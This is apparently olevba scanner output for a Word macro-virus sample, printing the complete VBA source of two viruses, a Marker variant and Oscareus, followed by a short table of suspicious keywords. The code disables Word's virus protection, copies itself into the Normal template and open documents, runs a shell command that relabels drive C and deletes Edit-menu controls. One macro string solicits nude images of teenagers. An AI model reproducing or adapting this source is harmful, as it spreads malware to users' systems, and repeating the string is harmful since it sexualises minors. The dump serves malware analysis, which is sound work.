olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.o-7260e9de619eca6a1736c4ef21e82adb03716745
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.o-7260e9de619eca6a1736c4ef21e82adb03716745 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim x1, x2, x3, x4 As Boolean
Dim x5, x6 As Object
Dim x7, x8, x16 As Integer
Dim x9 As Date
Dim x10, x11, x12, x13, x14 As String
Const x15 = ":-D you are marked!"
Private Sub Document_Close()
On Error Resume Next
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.CodeModule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.CodeModule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
If x7 >= 23 And x8 = 7 Then
    Application.Caption = "Happy Birthday Shankar-25th July.The World may Forget but not me"
    x10 = MsgBox("Did You Wish Shankar on his Birthday ?", vbYesNo)
    If x10 = vbYes Then
        MsgBox "Thank You! I Love You. You are wonderfull."
    Else
        MsgBox " You are Heart Less." & vbCrLf & "You Will Be Punished For This", vbCritical
    End If
End If
If x3 = True Then
    x13 = x5.CodeModule.Lines(1, x5.CodeModule.CountOfLines)
ElseIf x4 = True Then
    x13 = x6.CodeModule.Lines(1, x6.CodeModule.CountOfLines)
End If

If (x3 = True Xor x4 = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then

      If x3 = True Then
        x2 = NormalTemplate.Saved
        x11 = x5.CodeModule.Lines(1, x5.CodeModule.CountOfLines)
        x6.CodeModule.deletelines 1, x6.CodeModule.CountOfLines
        x6.CodeModule.AddFromString x11
        With Dialogs(wdDialogFileSummaryInfo): .Title = "Are You suprised ?": .Subject = "Birthday ": .Author = "LSK": .Category = "You Are Infected": .Keywords = "Birthday": .Comments = "Shankar's Birthday falls on 25th July.  Don't Forget to wish him": .Execute: End With
        If x2 = True Then NormalTemplate.Save
      End If
    If x4 = True Or ActiveDocument.Saved = False Then
     x1 = ActiveDocument.Saved
     x11 = x6.CodeModule.Lines(1, x6.CodeModule.CountOfLines)
     x5.CodeModule.deletelines 1, x5.CodeModule.CountOfLines
     x5.CodeModule.AddFromString x11
     With Dialogs(wdDialogFileSummaryInfo): .Title = "Are You suprised ?": .Subject = "Birthday ": .Author = "LSK": .Category = "You Are Infected": .Keywords = "Birthday": .Comments = "Shankar's Birthday falls on 25th July.  Don't Forget to wish him": .Execute: End With
     If x1 = True Then ActiveDocument.Save
   End If
  
    
End If

End Sub

Private Sub Document_New()
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.CodeModule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.CodeModule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If x4 = False Then
    x6.CodeModule.deletelines 1, x6.CodeModule.CountOfLines
End If
If x3 = False Then
        x5.CodeModule.deletelines 1, x5.CodeModule.CountOfLines
End If

x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
If x7 >= 23 And x8 = 7 Then
With Selection.Font: x16 = .Size: .Size = 72: .ColorIndex = wdGreen: .Animation = wdAnimationSparkleText: Selection.InsertAfter "Happy BirthDay Shankar": Selection.MoveDown Unit:=wdScreen, Count:=2: .Size = x16: .ColorIndex = wdAuto: .Animation = wdAnimationNone: End With
End If
End Sub

Private Sub Document_Open()

Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.CodeModule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.CodeModule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If x4 = False Then
    x6.CodeModule.deletelines 1, x6.CodeModule.CountOfLines
End If
If x3 = False Then
        x5.CodeModule.deletelines 1, x5.CodeModule.CountOfLines
End If

x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
If x7 >= 23 And x8 = 7 Then
    x10 = MsgBox("Did You Wish Shankar on his Birthday ?", vbYesNo)
End If
End Sub





















































-------------------------------------------------------------------------------
VBA MACRO oscareus.bas 
in file: Virus.MSWord.Marker.o-7260e9de619eca6a1736c4ef21e82adb03716745 - OLE stream: 'Macros/VBA/oscareus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub oscareus()
    
    'VMPCK 1.0d w/Random Path + Update
    '=================================
    'Code Written by VicodinES
    '=================================
    'Poppy ID : 7212-PxTk85607212.c
    '=================================
    'This Virus Is: Oscareus.Poppy
    
On Error Resume Next
Randomize
QoMjAhNf = NfAh6497 & MgOj8989
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("oscareus").Export "c:\oscareus.drv"
ActiveDocument.ReadOnlyRecommended = False
SgKm = Int(Rnd * 10)
If SgKm = 3 Then Call QuBt8560TfCt
If Month(Now()) = 10 And Day(Now()) = 7 Then MsgBox "Oscareus2000", vbInformation, "Birthday Greeting!!!"
CxJu15536 = ImLmPpNq & DmTi12589 & Int(Rnd * 5538)
If NormalTemplate.VBProject.VBComponents.Item("oscareus").Name <> "oscareus" Then CoBw72126788 = True
If ActiveDocument.VBProject.VBComponents.Item("oscareus").Name <> "oscareus" Then UhCq6786 = True
NmPwMnPi = FuRs6824 & LjGy2906
If CoBw72126788 = True And UhCq6786 = False Then Set UoJk67872126 = NormalTemplate.VBProject.VBComponents
If CoBw72126788 = False And UhCq6786 = True Then Set UoJk67872126 = ActiveDocument.VBProject.VBComponents
UoJk67872126.import "c:\oscareus.drv"
If CoBw72126788 = True And UhCq6786 = False Then Shell ("label c: OSCAREUS"), 0
If CoBw72126788 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
NqOuAkMs = JhQl10667 & JsPn6979
If UhCq6786 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
'VMPCK v1.0d [The Final Version?]
CzVuTlGz:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "fUck1n 0sc4r!", vbInformation
End Sub
Sub FileNew()
    On Error Resume Next
    Call oscareus
Dialogs(wdDialogFileNew).Show
RwMqFtPr = ClEt7490 & PsUx2959
    Skip = 1
    Call oscareus
QgTx1478 = LiMeDtDr & RtQj11024 & Int(Rnd * 1306)
End Sub
Sub FileSave()
    On Error Resume Next
RrEe11549 = DrRoSmOq & LlLw10712 & Int(Rnd * 4486)
    Call oscareus
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call oscareus
HzMr14323 = RpSeGoDk & HsHv16840 & PfTvVwEo & TpIj4783
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call oscareus
GoCm7322 = ToVhUuMy & MhSo6367 & Int(Rnd * 3818)
End Sub
Sub AutoExit()
    On Error Resume Next
    Call oscareus
UiTt3335 = PtFkBrNz & UgJg14490 & RtGwMtEj & DiQl14365
End Sub
Sub AutoClose()
    On Error Resume Next
    Call oscareus
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call oscareus
OoEsKxQe = SvAp11570 & OeGt15803
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call oscareus
DqGo7084 = RhUtTjIj & EfLn3898 & Int(Rnd * 1100)
MeQpGxNt = QoNg15831 & JtAj8937
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call oscareus
SvCpPlTz = LyKw18390 & UeLi11783
End Sub
Sub QuBt8560TfCt()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "Jestem sobie OscarN Jezeli macie zdjecia golych nastolatek z papierosem to podeslijcie mi!"
            .Replacement.Text = "Oscareus2000"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
FkUp5704 = RlIlClFj & QwJr5370 & Int(Rnd * 1973)
CommandBars("edit").Controls("Replace...").Delete
RkBu13095 = NlDvAgJj & MeCf12021 & Int(Rnd * 3151)
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

